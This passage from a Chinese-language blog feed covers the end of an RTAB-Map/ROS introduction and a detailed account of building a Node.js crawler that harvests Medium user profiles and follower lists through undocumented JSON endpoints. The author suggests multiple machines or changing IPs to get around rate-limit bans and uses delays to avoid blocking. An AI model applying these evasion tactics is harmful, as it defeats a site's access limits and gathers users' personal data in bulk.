RTAB Map 簡介RTAB-Map (Real-Time Appearance-Based Mapping) 是一種 RGB-D SLAM 的方法，跟 LSD SLAM 的目的很像，都是為了建出 3D 地圖並定位感測器位置，最主要的差別在於，LSD SLAM 使用的感測器是一個 RGB camera，而 RTAB-Map 使用的是 Kinect 這種 RGB-D camera。
這個番外篇沒有要詳細介紹這個演算法的設計概念，所以就直接從使用的角度出發啦。
因為 RTAB-Map 本身是一種 SLAM 的演算法，有人寫了 rtabmap_ros 這個 package，要在 ROS 中跑起 RTAB-Map 直接靠這個 package 就行了。不過要使用，還是需要一些基本的認知，接下來就簡短地跟大家介紹一下！
RTAB-Map 基本上有兩個模式 - Mapping mode 跟 Localization mode，Mapping mode 顧名思義就是建地圖，RTAB Map 會把地圖資料（例如影像、2D 地圖、3D 地圖）存起來，可以見下圖。

Localization mode 就是根據已經建好的地圖資料庫，來定位機器人現在的位置，一旦可以將機器人感測到的資料對應到地圖，就算是定位成功。
實際操作 RTAB-Map如果你去試玩看看他們的課程，直接用下面幾個指令就可以準備好所有東西，然後用你的鍵盤操控 turtlebot 就可以開始建地圖了。
roslaunch rtabmap_ros rtabmap.launch rtabmap_args:=&quot;--delete_db_on_start&quot;roslaunch rtabmap_ros demo_turtlebot_rviz.launchroslaunch turtlebot_teleop keyboard_teleop.launch

如果你有自己的 RGB-D sensor 想要玩，那你就直接參考安裝方法跟RGB-D Hand-Held Mapping With a Kinect也可以很快上手！
然後你可以用這一個指令啟動 Localization mode，那機器人收到的感測器資料就會被拿來跟地圖比對：
roslaunch rtabmap_ros rtabmap.launch localization:=true

哈不過之所以能這麼容易就啟動，也是因為 launch 檔把這個黑盒子包得很好，你可以去看看 rtabmap.launch。
總結這週跟大家介紹了 Robot Ignite Academy、ROS Develop Studio 跟 rtabmap_ros，希望大家學習愉快！
延伸閱讀
[ROS tutorial] RTAB-Map in ROS 101
RTAB-Map 官方 tutorial

]]></content>
      <tags>
        <tag>Robotics</tag>
        <tag>ROS</tag>
        <tag>SLAM</tag>
        <tag>LSD SLAM</tag>
        <tag>RTAB-Map</tag>
      </tags>
  </entry>
  <entry>
    <title>Medium 爬蟲進化史</title>
    <url>/2019/07/13/medium-crawler/</url>
    <content><![CDATA[前言前幾天的時候我在 Medium 上發了這篇文：Medium 中文寫作者追蹤人數排名與不專業數據分析，內文是我用 Node.js 寫了一個簡單的 Medium 爬蟲之後整理出來的數據。
在原本那篇文章裡面有簡單提到爬蟲的資料來源，但是對技術的部分沒有太多著墨。事實上，在寫 Medium 爬蟲的時候其實踩了一些坑，與其教大家寫一個 Medium 爬蟲，不如讓大家跟我一起走過這些坑，盡可能地還原我當初在寫這個爬蟲時碰到的障礙以及解決方法，我覺得這樣會更有趣一點。
因此，這篇就是用來記錄我寫這個 Medium 爬蟲的經過，其中也會有點教學的成份在，所以看完之後你應該也能夠寫出一個類似的爬蟲，或至少你看到 source code 的時候不會一頭霧水。
雖然說最後寫出來的是這個跟使用者資料有關的爬蟲，但我一開始其實是先從文章列表開始的，因為那時候剛好有一個需求，想要把自己的文章全部爬下來。
會有這個需求是因為 Medium 內建的功能其實滿爛的，你很難找到一個作者 po 過的所有文章，或者是說很難一目瞭然。所以早期的文章除了透過 Google 以外，是很難被找到的。
所以我後來就手動做了一個文章的索引，自己整理了以前發過的所有文章。但是身為工程師，這明明就是一件可以寫程式來做的事啊！所以想嘗試看看能不能先寫一個文章列表的爬蟲。
第一次嘗試：尋找資料來源對我來說，爬蟲的第一步也是最困難的一步就是找到資料來源。只要這一步完成了，其他的相比之下都比較簡單。
如果能拿到 Medium 的 API 那當然是最好的。若是沒有的話，就必須用 puppeteer 之類的東西去爬 HTML 然後自己 parse 了。
在 Medium 的文章列表那邊捲動一下並且打開 devtool，可以看到 medium 後面是用 GraphQL：

這個就麻煩了…我對 GraphQL 不太熟，要花時間去研究一下它的資料結構，感覺要花不少時間，於是那時我就暫時先放棄這條路，決定來試試看用 puppeteer。
第二次嘗試：puppeteer如果你不知道什麼是 puppeteer，我在這邊簡單介紹一下。你可以想成 puppeteer 會自動幫你打開一個瀏覽器，你可以寫程式去操控這個瀏覽器。例如說我要打開一個頁面並且在這頁面上執行 JS 等等，所以使用 puppeteer 的話，爬蟲的原理就是打開某個頁面，執行一段 JS 拿到頁面上的資料。
puppeteer 用起來很簡單，只要找一下現成的範例看一下語法，改一改就可以直接拿來用了。稍微研究了一下 HTML 結構之後，可以寫出下面的程式碼：
const puppeteer = require(&#x27;puppeteer&#x27;)  async function main() &#123;  const username = &#x27;hulitw&#x27;  const url = &#x27;https://medium.com/@&#x27; + username    const browser = await puppeteer.launch(&#123;    headless: true  &#125;)    // 造訪頁面  const page = await browser.newPage()  await page.goto(url, &#123;    waitUntil: &#x27;domcontentloaded&#x27;  &#125;)    // 執行準備好的 script 並回傳資料   const data = await page.evaluate(mediumParser)  console.log(data)    await page.close()  await browser.close()&#125;  function mediumParser() &#123;    // selector 是透過觀察而得來的  const elements = document.querySelectorAll(&#x27;section &gt; div:nth-child(2) &gt; div &gt; div&#x27;)  const result = []  for (let i = 0; i &lt; elements.length; i++) &#123;    const h1 = elements[i].querySelector(&#x27;h1&#x27;)    const a = elements[i].querySelectorAll(&#x27;a&#x27;)    if (h1) &#123;      result.push(&#123;        title: h1.innerText,        link: a[3].href      &#125;)    &#125;  &#125;  return result&#125;  main()

只要觀察出 HTML 與 CSS 的規則之後，就可以取得想拿的資料。但 Medium 不好爬是因為在 class name 的部分有使用 functional CSS，而且 class 的命名都有經過處理，看起來是用程式自動去跑的，所以只要 Medium 一更新，元素的命名應該會不太一樣。
所以最後只能從 HTML 的結構下手，去把文章給抓出來。
解決了這個問題之後，還有一個問題，那就是無限捲動。Medium 跟很多網頁一樣，要一直往下滑才會載入新文章，而這邊必須觀察的規律是滑到什麼時候才要停止。
觀察之後發現當發表過的文章載入完以後，才會顯示 Highlighted by xxx 這個區塊，所以可以用這個元素有沒有出現當作終止條件。
接著可以寫一段程式碼，讓頁面不斷往下捲動直到載入所有文章為止：
/*  要用的話就是： await scroll(page)*/  function getArticlesCount() &#123;  const elements = document.querySelectorAll(&#x27;section &gt; div:nth-child(2) &gt; div &gt; div&#x27;)  return elements.length&#125;  async function scroll(page) &#123;  await page.evaluate(&#x27;window.scrollTo(0, document.body.scrollHeight)&#x27;)  try &#123;      // 終止條件    await page.waitForSelector(&#x27;h4 ~ p&#x27;, &#123;      timeout: 1000    &#125;)  &#125; catch(err) &#123;      // 印出目前抓到的文章數目    const count = await page.evaluate(getArticlesCount);    console.log(`Fetching... $&#123;count&#125; articles`)      // 繼續往下捲動    await scroll(page);  &#125;&#125;

為了在 console 上讓我能看到現在的進度（可以確認程式是不是有 bug），還加了一段是每一次捲動都會印出現在畫面上有的文章數量。
做到這邊，就可以抓到使用者所有的文章標題以及連結了。
那發文日期呢？也拿得到嗎？
拿得到，但是麻煩很多。看看下面的 Medium 截圖就知道了：

如果是今年（2019）的文章，就不會顯示年份，否則的話就會顯示出發文年份。所以這邊要再經過特殊的判斷處理，而且只拿得到日期，拿不到詳細發文時間。
做到這邊，我就懶得再繼續下去了。想說有很多眉眉角角要處理，而且抓到的資料有限，還不如轉去研究 API 比較實在。
第三次嘗試：puppeteer + API前面已經說過我那時對 GraphQL API 不熟，所以暫時放棄了。但是嘗試了 puppeteer 之後，反而讓我有了新的思路。
在 puppeteer 裡面你可以加上監聽 network response 的事件，而頁面在載入文章的時候，一定會呼叫 API 去拿文章。這樣子事情不就好辦多了嗎？我不用自己研究怎麼 call API，我讓頁面自己去 call API，我自己只要監聽 response，研究一下 response 的格式就行了！
程式碼大概是長這樣的：
const apiResponses = []  page.on(&#x27;response&#x27;, async (response) =&gt; &#123;    if (response._url.indexOf(&#x27;graphql&#x27;) &lt; 0) return    const json = await response.json()    try &#123;      const post = parsePosts(json)      apiResponses.push(...post)    &#125; catch (err) &#123;    &#125;&#125;)  function parsePosts(json) &#123;  const result = []  try &#123;      // 研究到一半沒做完    const streams = json.data.user.profileStreamConnection.stream    for (stream of streams) &#123;      if (stream.itemType.__typename === &#x27;StreamItemCompressedPostList&#x27;) &#123;        &#125;    &#125;  &#125; catch (err) &#123;    &#125;&#125;

每次有新的 response 進來就可以解析一下並丟到 array 裡面，最後拿到的就會是完整的從 API 傳來的資料。
但後來我發現這條路也行不通。
為什麼呢？因為頁面在第一次載入的時候，從 Server 回傳的 HTML 就已經有前幾筆文章的資料了，往下捲動的時候才是使用 ajax 來載入新的文章。意思是說，如果我想靠監聽 ajax response 的方式拿到所有文章的資料是沒辦法的，前幾筆是拿不到的。
做到這邊的時候我有點心灰意冷，想說花了兩天寫出一個不能用的東西。抓取文章列表的部分做到這我就放棄了，懶得繼續花時間去研究，並且把心力轉向我真正想抓的東西。
最前面提到的抓文章列表的需求其實是突然蹦出來的，在這之前我有更想抓的東西：follower，我想統計臺灣寫作者的 follower 人數，然後看看自己可以排到第幾名（滿足一下虛榮心）。
在嘗試了抓文章列表並失敗以後，我有試過用類似的方式去抓 follower，但做到一半發現這樣抓的話效率也太差了，每次捲動載入 25 個 follower 的話，1000 人可是要捲動 40 次。
自己如果做不出來的話，答案就很明顯了：Google，就拜託你了！
第四次嘗試：Google 大神直接在 Google 打上關鍵字：medium follower api，出現的第一個搜尋結果是最無用的官方 API，幾乎什麼資料都沒給，而且要申請還要寄信給客服，有夠麻煩。
但是第二個搜尋結果讓我眼睛為之一亮，是一個 gist 檔案：Medium API: get number of followers for User · GitHub。
程式碼才五十行而已，很短，掃過一遍可以看到最關鍵的一行：
// BUILD THE URL TO REQUEST FROMfunction generateMediumProfileUri(username) &#123;  return `https://medium.com/@$&#123;username&#125;?format=json`;&#125;

什麼！原來還有這招，在網址後面加 ?format=json 就可以拿到 json 格式的資料，這真是太神奇了。
把得到的資料丟到 JSON Formatter 之後，可以看到大概的結構：

在這邊可以拿到使用者的個人資料以及發過的一些文章，也可以拿到我們的目標：follower！
我們順便來看一下使用者資料可以拿到些什麼：
&quot;user&quot;:&#123;     &quot;userId&quot;:&quot;f1fb3e40dc37&quot;,   &quot;name&quot;:&quot;Huli&quot;,   &quot;username&quot;:&quot;hulitw&quot;,   &quot;createdAt&quot;:1487549030919,   &quot;imageId&quot;:&quot;1*WQyJUJBQpBNIHH8GEWE6Sg.jpeg&quot;,   &quot;backgroundImageId&quot;:&quot;&quot;,   &quot;bio&quot;:&quot;自學程式，後來跑去唸哲學系但沒念完，前往新加坡工作了兩年半後決定放一年的假，到處旅遊。喜歡教學，發現自己好像有把事情講得簡單又清楚的能力，相信分享與交流可以讓世界更美好。\bMedium 文章列表請參考：https://aszx87410.github.io/blog/medium&quot;,   &quot;allowNotes&quot;:1,   &quot;mediumMemberAt&quot;:1542441600000,   &quot;isNsfw&quot;:false,   &quot;isWriterProgramEnrolled&quot;:true,   &quot;isQuarantined&quot;:false,   &quot;type&quot;:&quot;User&quot;&#125;

除了基本的自介跟姓名以外，還可以拿到成為 Medium 付費會員的時間以及成為 Medium 會員的時間，還滿有趣的，還有一個 flag 也很有趣：isNsfw。
唯一缺的就是 follower 的清單了。
這邊我嘗試用一樣的方法，在 Medium 網址後面接了參數：https://medium.com/@hulitw/followers?format=json，沒想到還真的有東西！在 response 裡面可以找到 10 個 follower 的資料。
有了資料之後就確定這個 API 是有用的，再來直接跳到 response 最下面 paging 的部分：
&quot;paging&quot;:&#123;     &quot;path&quot;:&quot;https://medium.com/_/api/users/f1fb3e40dc37/profile/stream&quot;,   &quot;next&quot;:&#123;        &quot;limit&quot;:10,      &quot;to&quot;:&quot;10590c54e527&quot;,      &quot;source&quot;:&quot;followers&quot;,      &quot;page&quot;:2   &#125;&#125;

path 的部分看起來是個 API 網址，next 應該是參數，試著把這些參數帶到網址上面：https://medium.com/_/api/users/f1fb3e40dc37/profile/stream?limit=10&amp;to=10590c54e527&amp;source=followers&amp;page=2 ，就出現了只有 follower 相關的資料！

試著把 limit 換一下，發現最大值應該是 25，一次可以抓 25 筆資料；page 換一下之後發現沒什麼作用，於是把 to 也改一下，發現可以成功抓到新的資料。看來分頁機制是採用 cursor based 的。
在經過了幾次嘗試之後，終於拿到了兩個 API 的網址，一個可以獲得詳細個人資料，另外一個可以拿到 follower 的列表！
資料來源確定有了之後，就可以來構思一下爬蟲的架構了。
爬蟲架構我要怎麼樣才能儘可能爬到所有的台灣寫作者？
首先第一個問題是我們必須把範圍放大一點，因為中文寫作者裡面可能有香港來的或是中國來的，你比較難靠程式去辨別到底是哪裡來的，尤其是香港跟台灣，因為都使用繁體中文。
為了不讓問題變得更複雜，我們只要能抓到「中文使用者就好」。
那要怎麼樣才能抓到最多中文使用者？一個很簡單的策略就是我們預設中文使用者的 follower 應該都是中文使用者，所以我們只要從某個使用者開始，把他所有的 follower 都丟進一個 queue 裡面，一直持續這個動作就好。
用文字簡化就是這樣：

從 queue 裡面拿出一個使用者
把他的資料寫進資料庫
把他的所有 follower 丟進 queue
回到步驟一

這樣子就可以靠著一個使用者無限延伸出去，而且理論上來說可以抓到超級多使用者的資料。這邊之所有選擇 follower（追蹤我的人）而不是 following（我追蹤的人），是考量到追蹤的使用者可能會有別的國家的，例如說我可能會追蹤國外的工程師之類的，但因為我不寫英文，所以國外的工程師應該不會來追蹤我。這樣的話就可以讓使用者侷限在中文，符合我們的目標。
接著就是系統架構的部分，這邊依據你想達成的效率會有不同種做法。
對我來說效率會最高的就是找那種很適合用來當 queue 的 service，例如說 redis 之類的，然後資料庫的部分可以選用 MySQL 或任何你熟悉的軟體。這樣子的好處是你可以開不同機器，然後每一台機器都是一個 worker，例如說你開五台機器，就會有五個 worker 一直從 queue 裡面拿東西出來並且把 follower 丟進去。
這邊之所以開很多台機器而不是開很多 thread 或 process，是因為 rate limiting 的問題。一般 API 都會有流量限制，你如果同一個 IP 發太多 request 會被 ban 掉或者是一段時間拿不到 response，所以開再多 process 跟 thread 都沒有用，只能開不同機器來解決（或只要有辦法換 IP 的話就可以）。
後來因為我沒有很在乎效率而且懶得開很多機器，所以只打算開一台讓他慢慢抓。如果只有一個 worker 的話，queue 的部分也可以簡單做一下，這邊我就也用 MySQL 來實做簡單的 queue，讓整個爬蟲的架構變得很簡單。
我們可以來看一下資料庫的架構：
Users


id
userId
username
name
bio
follower
fr
mediumMemberAt
createdAt



自增ID
使用者 ID
前面加上 @ 就是 profile 網址
使用者名稱
自介
追蹤人數
分類
成為付費會員的時間
加入會員的時間


Queue


id
userId



自增ID
使用者 ID


程式的執行流程是這樣的：

從 Queue 裡面拿出一個 userId
如果 userId 已存在 Users，回到步驟一
把他的資料寫進 Users
把他的所有 follower 丟進 Queue
回到步驟一

從 queue 拿出來的時候先確保沒有爬過這個使用者，有的話就跳過，然後把所有追蹤者再丟到 queue 裡面，這樣程式就會一直跑，直到 queue 裡面沒有東西為止。
架構設計好之後，就可以來開始 coding 啦！
第一版爬蟲首先我們需要有一個 queue，能夠 push 跟 pop，還要能確定現在拿的 userId 是不是已經爬過了。這個很適合用 class 來實作：
class Queue &#123;  constructor(conn) &#123;    this.conn = conn  &#125;    get() &#123;    return new Promise((resolve, reject) =&gt; &#123;      this.conn.query(&#x27;SELECT userId from Queues limit 1&#x27;, (error, results) =&gt; &#123;        if (error) &#123;          console.log(error)          return reject(error)        &#125;        if (results.length !== 1) &#123;          return resolve(null)        &#125;        const data = results[0]        this.conn.query(&#x27;DELETE from Queues where userId=?&#x27;, [data.userId], (err, results) =&gt; &#123;          if (error) &#123;            console.log(error)            return reject(error)          &#125;          return resolve(data.userId)        &#125;)      &#125;);    &#125;)  &#125;    check(uid) &#123;    return new Promise((resolve, reject) =&gt; &#123;      this.conn.query(&#x27;SELECT userId from Users where userId=?&#x27;, [uid], function (error, results) &#123;        if (error) &#123;          return reject(error)        &#125;        if (results.length &gt; 0) &#123;          return resolve(false)        &#125;        return resolve(true)      &#125;);    &#125;)  &#125;    push(list) &#123;    return new Promise((resolve, reject) =&gt; &#123;      const values = []      for (let item of list) &#123;        values.push([item])      &#125;      this.conn.query(`        INSERT IGNORE INTO Queues (userId) VALUES ?`, [values], (err) =&gt; &#123;          if (err) &#123;            // console.log(err)          &#125;          resolve()        &#125;      )    &#125;)  &#125;&#125;

有了 queue 以後可以來寫主要邏輯，主程式的架構會長這樣：
var connection = mysql.createPool(&#123;  connectionLimit : 10,  host     : process.env.host,  user     : &#x27;&#x27;,  password : &#x27;&#x27;,  database : &#x27;medium&#x27;,  charset: &#x27;utf8mb4&#x27;&#125;)async function main() &#123;  const queue = new Queue(connection)    // 不斷從 queue 拿東西出來  while(true) &#123;    const userId = await queue.get()    if (!userId) &#123;      console.log(&#x27;no data from queue, end&#x27;)      break;    &#125;      // 看看是否已經爬過，爬過就跳掉    const check = await queue.check(userId)    if (!check) &#123;      continue    &#125;      // 拿 userId 做你想做的事    console.log(&#x27;uid:&#x27;, userId)  &#125;&#125;

接著只要實作以下兩個功能就好：

抓取使用者資料
把使用者資料寫進資料庫
把 follower 丟回 queue

由於 Medium API 的 response 都會有一個防 json hijacking 的開頭，因此我們可以包裝一個函式專門來 parse API 的 response：
async function getMediumResponse(url) &#123;  try &#123;    const response = await axios.get(url)    const json = JSON.parse(response.data.replace(&#x27;])&#125;while(1);&lt;/x&gt;&#x27;, &#x27;&#x27;))    return json  &#125; catch(err) &#123;    return null  &#125; &#125;

接著就可以寫兩個 function，一個抓使用者資料，一個抓 follower 資料（有出現 _ 的都是 lodash 的 function）：
async function getUserInfo(uid) &#123;  const url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream`  const json = await getMediumResponse(url)  if (!json) &#123;    return &#123;&#125;  &#125;  const userId = _.get(json, &#x27;payload.user.userId&#x27;)  const follower = _.get(json, `payload.references.SocialStats.$&#123;userId&#125;.usersFollowedByCount`, 0)    return &#123;    followerCount: follower,    userId: userId,    name: _.get(json, &#x27;payload.user.name&#x27;),    username: _.get(json, &#x27;payload.user.username&#x27;),    bio: _.get(json, &#x27;payload.user.bio&#x27;),    mediumMemberAt: _.get(json, &#x27;payload.user.mediumMemberAt&#x27;),    isWriterProgramEnrolled: _.get(json, &#x27;payload.user.isWriterProgramEnrolled&#x27;),    createdAt: _.get(json, &#x27;payload.user.createdAt&#x27;),  &#125;&#125;async function getFollowers(uid, to) &#123;  let url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream?source=followers&amp;limit=200`  if (to) &#123;    url += &#x27;&amp;to=&#x27; + to  &#125;  const json = await getMediumResponse(url)  if (!json) &#123;    return &#123;&#125;  &#125;  const followers = _.keys(json.payload.references.Social) || []  const nextTo = _.get(json, &#x27;payload.paging.next.to&#x27;)  return &#123;    followers,    nextTo  &#125;&#125;

基本上都是 call API 之後稍微處理一下資料，然後把我們關注的東西傳回去。
上面我們只實做了「抓一次 follower」的 function，所以最後還要再實作一個「抓全部 follower 並且丟進 queue」的 function：
async function getAllFollowers(uid, queue) &#123;  const followers = []  let to = undefined  while (true) &#123;    const data = await getFollowers(uid, to)    if (!data) &#123;      break;    &#125;    followers.push(...data.followers)    to = data.nextTo    console.log(uid, &#x27;fetching...&#x27;, followers.length)    if (data.followers.length === 0 || !to) &#123;      break;    &#125;    await queue.push(data.followers)  &#125;  return followers&#125;

這個函式會不斷去抓 follower 出來並丟進 queue，並且印出現在總共抓了幾筆 follower 的資料，全部抓完會把所有的 follower 回傳回去（會回傳是因為一開始我是全部抓完才一次寫進 queue，但後來發現比較沒效率，所以改成現在這樣抓一次就寫一次）。
最後是把使用者資料寫進去資料庫的程式碼：
function format(time) &#123;  if (!time) return null  return moment(time).format(&#x27;YYYY-MM-DD HH:mm:ss&#x27;)&#125;  function saveUserInfo(conn, info) &#123;  conn.query(`    INSERT INTO Users    (      userId, username, name, bio, follower,      mediumMemberAt, createdAt, isWriterProgramEnrolled    ) VALUES ?`, [[[      info.userId, info.username, info.name, info.bio, info.followerCount,      format(info.mediumMemberAt), format(info.createdAt), info.isWriterProgramEnrolled    ]]], (err) =&gt; &#123;      if (err) &#123;        // console.log(err)      &#125;    &#125;  )&#125;

把這幾個核心功能的 function 寫完以後，只要修正一下我們的主程式，就可以把整個爬蟲完成了：
async function main() &#123;  const queue = new Queue(connection)    while(true) &#123;      // 1. 從 Queue 裡面拿出一個 userId    const userId = await queue.get()    if (!userId) &#123;      console.log(&#x27;no data from queue, end&#x27;)      break;    &#125;      // 2. 如果 userId 已存在 Users，回到步驟一    const check = await queue.check(userId)    if (!check) &#123;      continue    &#125;      console.log(&#x27;uid:&#x27;, userId)    try &#123;      const info = await getUserInfo(userId)            // 如果沒抓到資料有可能是被擋了，先停個 3 秒      if (!info.userId) &#123;        console.log(&#x27;sleep...&#x27;)        await sleep(3000)      &#125;        // 3. 把他的資料寫進 Users      saveUserInfo(connection, info)        // 4. 把他的所有 follower 丟進 Queue      if (info.followerCount &gt; 0) &#123;        // 把 followers 放到 queue 並印出總共幾筆資料        const followerList = await getAllFollowers(userId, queue)        console.log(&#x27;Add &#x27; + followerList.length + &#x27; into queue.&#x27;)      &#125;    &#125; catch(err) &#123;      // 有錯誤就先睡個 3 秒      console.log(&#x27;error...sleep&#x27;)      await sleep(3000)    &#125;   &#125;  &#125;

上面就是我們按照先前的邏輯寫出來的程式碼：

從 Queue 裡面拿出一個 userId
如果 userId 已存在 Users，回到步驟一
把他的資料寫進 Users
把他的所有 follower 丟進 Queue
回到步驟一

不過這邊額外加了一個邏輯是當呼叫 API 有問題的時候，就先暫停 3 秒鐘，這樣是為了防止被 rate limiting 擋到。但這個機制做的不是很好，因為沒有 retry，所以一但發生錯誤，這個 userId 就被跳過了。
當初的想法是只跳過一個 userId 無傷大雅，畢竟 queue 裡面可能有十萬筆的 userId，而且就算跳過，之後還是有可能再被丟到 queue 裡面，所以不做 retry 的機制也無所謂。
上面的程式碼全部組裝起來，就是第一版爬蟲的雛形了。運作的 ok 沒什麼問題，就只是速度比較慢而已。而且 queue 增長的速度比想像中驚人，我跑了一個晚上 queue 大概就多了十萬筆資料，而 users 裡面卻只有四五千筆而已。
不過在跑了一個晚上之後，我發現了一個致命的錯誤。
第二版爬蟲：判斷中文這個致命的錯誤就是當初的預設：「中文作者的 follower 都是中文作者」是有問題的，而且仔細想想會發現這個預設的確很不可靠。
所以跑了一個晚上的爬蟲，我發現資料庫裡面多了一大堆外國使用者。而且一但多了一個，你的 queue 裡面就會出現一大堆的外國使用者。
為了避免這個情形，我決定從自介跟暱稱下手，寫一個判斷自介跟暱稱是否含有中文的函式，如果有中文才被放進來。這邊我直接複製在 Stack Overflow 上找到的程式碼，看起來十分神奇：
function isChinese(text = &#x27;&#x27;) &#123;  // @see: https://stackoverflow.com/questions/44669073/regular-expression-to-match-and-split-on-chinese-comma-in-javascript/51941287#51941287  const regex = /(\p&#123;Script=Hani&#125;)+/gu;  return text.match(regex)&#125;

在 queue 裡面抓完使用者資料後會進行判斷：
const info = await getUserInfo(userId)  // 非中文，直接略過if (!isChinese(info.bio) &amp;&amp; !isChinese(info.name)) &#123;	continue;&#125;

做這個判斷的時候我就已經想到會有一個問題，那就是有些人他們喜歡國際化一點，在自介會放全英文，暱稱也會是英文，所以會被誤判。明明就是用中文寫作，但是卻沒有被加進 queue 裡面。
這邊我當時覺得無所謂，畢竟這樣的人不多，而且要解的話有點麻煩。當時我腦中本來就有浮現一個解法，就是去抓他最近拍手過或發表過的文章，看看標題是不是中文，這樣的判斷會準確很多。但當時我懶得實作，想說先讓爬蟲繼續跑一天看看。
隔天早上，又發現了一個完全沒想過會碰到的問題。
第三版爬蟲：判斷日文使用者清單裡面出現一大堆日本人。
因為他們有些暱稱是漢字，要嘛就是自介有漢字，所以不會被中文判斷篩掉。發現這個問題的時候我第一個想法是：「如果這是在面試我一定被刷掉，這種 case 居然當初沒想到…」。
為了解決這種情況，就再找了一個判斷是不是有日文（不含漢字）的正則表達式：
function isJapanese(text = &#x27;&#x27;) &#123;  // @see: https://gist.github.com/ryanmcgrath/982242  const regexJP = /[\u3040-\u309F]|[\u30A0-\u30FF]/g;   const jp = text.match(regexJP)  if (jp &amp;&amp; jp.length &gt;= 3) &#123;    return true  &#125;  return false&#125;

如果含有三個以上的日文字母，就回傳是日文。這邊會設定數量是我怕有些台灣人用什麼 の 之類的，就會被誤判。不過除了寫死數量以外，還有個比較好的做法可能是看比例，例如說一句話如果有八九成是中文字，就是中文之類的。
判斷邏輯的部分改成這樣：
const info = await getUserInfo(userId)  // 非中文，直接略過if (!isChinese(info.bio) &amp;&amp; !isChinese(info.name)) &#123;	continue;&#125;  if (isJapanese(info.bio) || isJapanese(info.name)) &#123;    continue;&#125;

如果不是中文就跳過，再來確認是不是日文，如果自介或是暱稱是日文也跳過。
好，這樣就沒有問題了吧！於是我把資料砍光，再讓爬蟲跑一個晚上試試看。
隔天起來，發現我真是天真的可以。
第四版爬蟲：直接重構打開資料庫，發現還是有很多日本使用者。原因在於他們可能暱稱是用漢字，然後沒有寫自介，或者自介只有一兩個字之類的，所以還是會被判定為是中文使用者。
追根究底，都是這個判斷機制太不可靠的原因。
既然事情已經到這個地步，就沒辦法偷懶了，我只能實作剛開始提到的更準確的解法：「看看最近發表過或是拍手過的文章是不是中文」，而這部分的資料幸好原本的 API 就有提供，實作起來比想像中簡單許多。
除了這個以外，由於 queue 增長的速度比消耗的速度快太多，因此我一度改變了一下方法。我寫了另外一支小程式，把原本流程中的「把 followers 丟到 queue」拿掉，並且一次拿 10 筆使用者資料出來。
換句話說，這個新的小程式做的事情很簡單，就是不斷抓使用者資料並存到資料庫，這樣 queue 就會一直變小，讓使用者資料愈來愈多。大概一個小時可以抓兩萬筆，累積一個晚上的 queue 白天花半天就可以跑完。
好處就是我可以快速累積使用者資料，畢竟原本的實作太慢了，一天大概只能跑個一萬筆左右，現在新的實作因為不用把東西丟到 queue 裡面，會讓使用者資料長得很快。
那時候偷懶直接複製程式碼改一下就做完這個新的小程式，導致程式寫到這邊愈來愈亂，考量到之後想要 open source，是時候整理一下程式碼了，於是就順便把程式重構一下。
重構完的架構如下：
.├── README.md     // 說明├── app.js        // 主程式├── getUsers.js   // 只抓使用者資料的小程式 ├── config.js     // 設定檔├── db.js         // 資料庫相關├── medium.js     // medium API 相關├── package.json  ├── queue.js     └── utils.js       

我們先從 config 開始看起吧：
module.exports = &#123;  db: &#123;    connectionLimit: 10,    host     : &#x27;&#x27;,    user     : &#x27;&#x27;,    password : &#x27;&#x27;,    database : &#x27;medium&#x27;,    charset: &#x27;utf8mb4&#x27;  &#125;,  batchLimit: 1, // 一次抓多少筆使用者資料  randomDelay: function() &#123;    return Math.floor(Math.random() * 200) + 100  &#125;,  errorRateTolerance: 0.2,  delayWhenError: 500&#125;

這邊就是放一些設定檔，包括資料庫的設定以及一些抓資料的參數，大多數都是跟抓使用者資料的那個小程式有關，例如說要抓幾筆，然後每一次要停多久之類的。這些都是為了避免送太多 request 被擋而做的措施。
再來看一下 utils.js：
module.exports = &#123;  // @see: https://stackoverflow.com/questions/44669073/regular-expression-to-match-and-split-on-chinese-comma-in-javascript/51941287#51941287  isChinese: (text = &#x27;&#x27;) =&gt; &#123;    const regex = /(\p&#123;Script=Hani&#125;)+/gu;    return text.match(regex)  &#125;,    // @see: https://gist.github.com/ryanmcgrath/982242  isJapanese: (text = &#x27;&#x27;) =&gt; &#123;    const regexJP = /[\u3040-\u309F]|[\u30A0-\u30FF]/g;     const jp = text.match(regexJP)      // more than 2 japanese char    if (jp &amp;&amp; jp.length &gt;= 2) &#123;      return true    &#125;    return false  &#125;,    sleep: ms =&gt; new Promise(resolve =&gt; &#123;    setTimeout(resolve, ms)  &#125;),    log: function () &#123;    const args = Array.prototype.slice.call(arguments);    console.log.apply(console, args)  &#125;&#125;

這邊基本上就是把剛剛用到的一些函式搬過來統一放在這邊，日文字母的限制縮小為兩個，然後把 console.log 包裝了一下，想說之後要客製化比較方便。
然後是 medium.js，這邊是有關 medium API 的部分，並且新增了一個函式 isMandarinUser 來判斷是否是中文使用者：
const axios = require(&#x27;axios&#x27;)const _ = require(&#x27;lodash&#x27;)const utils = require(&#x27;./utils&#x27;)const JSON_HIJACKING_PREFIX = &#x27;])&#125;while(1);&lt;/x&gt;&#x27;  // wrapper function, return null instead of throwing errorasync function getMediumResponse(url) &#123;  try &#123;    const response = await axios.get(url)    const json = JSON.parse(response.data.replace(JSON_HIJACKING_PREFIX, &#x27;&#x27;))    return json  &#125; catch(err) &#123;    return null  &#125;&#125;  function isMandarinUser(name, bio, posts) &#123;    // if bio or name is japanese, must be japanese  if (utils.isJapanese(name) || utils.isJapanese(bio)) &#123;    return false  &#125;     // this user has no activity on medium, decide by name and bio  if (!posts) &#123;    return utils.isChinese(name) || utils.isChinese(bio)  &#125;    const contents = _.values(posts).map(item =&gt; item.title + _.get(item, &#x27;content.subtitle&#x27;))  return Boolean(    contents.find(item =&gt; &#123;      return utils.isChinese(item) &amp;&amp; !utils.isJapanese(item)    &#125;)  )&#125;  module.exports = &#123;  getFollowers: async (uid, to) =&gt; &#123;    let url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream?source=followers&amp;limit=200`    if (to) &#123;      url += &#x27;&amp;to=&#x27; + to    &#125;    const json = await getMediumResponse(url)    if (!json) &#123;      return null    &#125;    const followers = _.keys(json.payload.references.Social) || []    const nextTo = _.get(json, &#x27;payload.paging.next.to&#x27;)    return &#123;      followers,      nextTo    &#125;  &#125;,    getUserInfo: async (uid) =&gt; &#123;    const url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream`    const json = await getMediumResponse(url)    if (!json) &#123;      return &#123;&#125;    &#125;    const userId = _.get(json, &#x27;payload.user.userId&#x27;)    const follower = _.get(json, `payload.references.SocialStats.$&#123;userId&#125;.usersFollowedByCount`, 0)      const posts = 